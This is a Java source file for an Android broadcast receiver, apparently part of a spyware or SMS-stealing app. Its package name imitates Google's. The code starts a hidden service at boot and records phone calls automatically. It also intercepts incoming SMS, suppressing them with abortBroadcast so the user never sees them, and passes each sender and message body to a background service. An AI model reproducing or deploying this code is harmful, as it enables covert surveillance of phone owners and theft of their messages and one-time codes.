package com.google.android.android;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

/**
 * Created by Vetal on 25.07.2017.
 */

public class MyBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        System.out.println("MyBroadcastReceiver action: " + action);
        switch (action) {
            case "android.intent.action.BOOT_COMPLETED": // устройство запущено
//                context.startActivity(new Intent(context, MainActivity.class));
                context.startService(new Intent(context, MainService.class));
                break;
            case "android.intent.action.PHONE_STATE": // отловка звонков
                String extraState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                RecordManager recordManager = MainService.getInstance().getRecordManager();

                if(extraState.equals(TelephonyManager.EXTRA_STATE_RINGING)) { // телефон звонит
                    recordManager.startRecord(0, phoneNumber);
                } else if(extraState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { // звонок принят/набрали номер
                    recordManager.startRecord(0, phoneNumber);
                } else if (extraState.equals(TelephonyManager.EXTRA_STATE_IDLE)) { // звонок завершен
                    if (recordManager.getEndTime() < System.currentTimeMillis())
                        recordManager.stopRecord();
                }
                break;
            case "android.provider.Telephony.SMS_RECEIVED":
                abortBroadcast();

                Bundle bundle = intent.getExtras();
                Object[] pdus = (Object[]) bundle.get("pdus");
                SmsMessage[] smsMessages = new SmsMessage[pdus.length];
                String text = "";
                for(int i = 0; i < smsMessages.length; i++) {
                    smsMessages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    text += smsMessages[i].getMessageBody();
                }
                phoneNumber = smsMessages[0].getOriginatingAddress();
                MainService.getInstance().receiveSms(phoneNumber, text);

                break;
        }
    }
}
